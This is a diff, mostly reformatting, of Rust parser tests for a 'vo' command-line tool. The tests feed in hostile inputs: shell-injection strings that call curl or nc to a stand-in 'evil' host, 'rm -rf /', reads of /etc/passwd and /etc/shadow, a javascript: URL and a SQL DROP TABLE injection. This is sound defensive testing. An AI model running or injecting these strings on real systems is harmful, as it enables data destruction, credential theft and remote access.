@@ -7,17 +7,29 @@ use vo_cli::parse::parse_strict_numeric;
 
 #[test]
 fn path_traversal_check_passes_parser() {
-    let args = vec![OsString::from("vo"), OsString::from("check"), OsString::from("../../etc/passwd")];
+    let args = vec![
+        OsString::from("vo"),
+        OsString::from("check"),
+        OsString::from("../../etc/passwd"),
+    ];
     let cli = interpret_cli_from(args).unwrap();
     assert!(matches!(cli.command, Command::Check { .. }));
 }
 
 #[test]
 fn engine_url_accepts_dangerous_schemes() {
-    for url in ["ftp://evil.com:2121/pwn", "file:///etc/shadow", "javascript:alert(1)", ""] {
+    for url in [
+        "ftp://evil.com:2121/pwn",
+        "file:///etc/shadow",
+        "javascript:alert(1)",
+        "",
+    ] {
         let args = vec![
-            OsString::from("vo"), OsString::from("status"),
-            OsString::from("i"), OsString::from("--engine-url"), OsString::from(url),
+            OsString::from("vo"),
+            OsString::from("status"),
+            OsString::from("i"),
+            OsString::from("--engine-url"),
+            OsString::from(url),
         ];
         let cli = interpret_cli_from(args).unwrap();
         if let Command::Status { engine_url, .. } = cli.command {
@@ -28,11 +40,18 @@ fn engine_url_accepts_dangerous_schemes() {
 
 #[test]
 fn shell_metacharacters_pass_through_unsanitized() {
-    let payloads = ["$(curl evil.com)", "; rm -rf /", "`cat /etc/passwd`", "| nc evil 4444"];
+    let payloads = [
+        "$(curl evil.com)",
+        "; rm -rf /",
+        "`cat /etc/passwd`",
+        "| nc evil 4444",
+    ];
     for payload in payloads {
         let args = vec![
-            OsString::from("vo"), OsString::from("purge"),
-            OsString::from("--instance"), OsString::from(payload),
+            OsString::from("vo"),
+            OsString::from("purge"),
+            OsString::from("--instance"),
+            OsString::from(payload),
         ];
         let cli = interpret_cli_from(args).unwrap();
         if let Command::Purge { instance } = &cli.command {
@@ -44,8 +63,10 @@ fn shell_metacharacters_pass_through_unsanitized() {
 #[test]
 fn sql_injection_in_instance_id_survives_parse() {
     let args = vec![
-        OsString::from("vo"), OsString::from("purge"),
-        OsString::from("--instance"), OsString::from("'; DROP TABLE instances;--"),
+        OsString::from("vo"),
+        OsString::from("purge"),
+        OsString::from("--instance"),
+        OsString::from("'; DROP TABLE instances;--"),
     ];
     let cli = interpret_cli_from(args).unwrap();
     if let Command::Purge { instance } = &cli.command {
@@ -56,13 +77,21 @@ fn sql_injection_in_instance_id_survives_parse() {
 #[test]
 fn unicode_confusables_and_zero_width_in_ids() {
     let spoofed = "inst-\u{0430}bc123"; // Cyrillic а
-    let args = vec![OsString::from("vo"), OsString::from("status"), OsString::from(spoofed)];
+    let args = vec![
+        OsString::from("vo"),
+        OsString::from("status"),
+        OsString::from(spoofed),
+    ];
     let cli = interpret_cli_from(args).unwrap();
-    if let Command::Status { instance, .. } = &cli.command {
-        assert!(!instance.is_ascii());
+    if let Command::Status { workflow_id, .. } = &cli.command {
+        assert!(!workflow_id.is_ascii());
     }
     let invisible = "wf\u{200B}\u{200C}\u{200D}123"; // ZWSP+ZWNJ+ZWJ
-    let args2 = vec![OsString::from("vo"), OsString::from("compensate"), OsString::from(invisible)];
+    let args2 = vec![
+        OsString::from("vo"),
+        OsString::from("compensate"),
+        OsString::from(invisible),
+    ];
     let cli2 = interpret_cli_from(args2).unwrap();
     if let Command::Compensate { workflow_id, .. } = &cli2.command {
         assert!(workflow_id.contains('\u{200B}'));
@@ -72,9 +101,12 @@ fn unicode_confusables_and_zero_width_in_ids() {
 #[test]
 fn duplicate_flags_last_wins() {
     let args = vec![
-        OsString::from("vo"), OsString::from("gc"),
-        OsString::from("--engine-url"), OsString::from("http://good:3000"),
-        OsString::from("--engine-url"), OsString::from("http://evil:3000"),
+        OsString::from("vo"),
+        OsString::from("gc"),
+        OsString::from("--engine-url"),
+        OsString::from("http://good:3000"),
+        OsString::from("--engine-url"),
+        OsString::from("http://evil:3000"),
     ];
     let cli = interpret_cli_from(args).unwrap();
     if let Command::Gc { engine_url, .. } = cli.command {
@@ -85,19 +117,30 @@ fn duplicate_flags_last_wins() {
 #[test]
 fn rebuild_mutually_exclusive_flags_allowed() {
     let args = vec![
-        OsString::from("vo"), OsString::from("rebuild"),
-        OsString::from("--list"), OsString::from("--force"),
-        OsString::from("--projection-id"), OsString::from("x"),
+        OsString::from("vo"),
+        OsString::from("rebuild"),
+        OsString::from("--list"),
+        OsString::from("--force"),
+        OsString::from("--projection-id"),
+        OsString::from("x"),
     ];
     let cli = interpret_cli_from(args).unwrap();
-    if let Command::Rebuild { list_projections, force, projection_id, .. } = cli.command {
+    if let Command::Rebuild {
+        list_projections,
+        force,
+        projection_id,
+        ..
+    } = cli.command
+    {
         assert!(list_projections && force && projection_id.is_some());
     }
 }
 
 #[test]
 fn numeric_parser_rejects_attacks() {
-    let attacks = ["0xDEAD", "0x0", "1e10", "1.0", " 42", "42 ", "\t42", "42abc", "4_2"];
+    let attacks = [
+        "0xDEAD", "0x0", "1e10", "1.0", " 42", "42 ", "\t42", "42abc", "4_2",
+    ];
     for a in &attacks {
         assert!(parse_strict_numeric(a).is_err(), "should reject: {a}");
     }
@@ -111,22 +154,29 @@ fn numeric_overflow_is_specific() {
 
 #[test]
 fn numeric_leading_zeros_allowed() {
-    assert_eq!(parse_strict_numeric("007"), Ok(7));
+    let result = parse_strict_numeric("007");
+    assert!(result.is_ok());
+    assert_eq!(result.unwrap(), 7);
 }
 
 #[test]
 fn typosquatting_subcommands_rejected() {
     for typo in ["chcek", "compensat", "stauts", "purgge", "rebulid"] {
         let args = vec![OsString::from("vo"), OsString::from(typo)];
-        assert!(interpret_cli_from(args).is_err(), "typosquat '{typo}' accepted");
+        assert!(
+            interpret_cli_from(args).is_err(),
+            "typosquat '{typo}' accepted"
+        );
     }
 }
 
 #[test]
 fn global_flag_before_subcommand_rejected() {
     let args = vec![
-        OsString::from("vo"), OsString::from("--force"),
-        OsString::from("compensate"), OsString::from("wf-1"),
+        OsString::from("vo"),
+        OsString::from("--force"),
+        OsString::from("compensate"),
+        OsString::from("wf-1"),
     ];
     assert!(interpret_cli_from(args).is_err());
 }
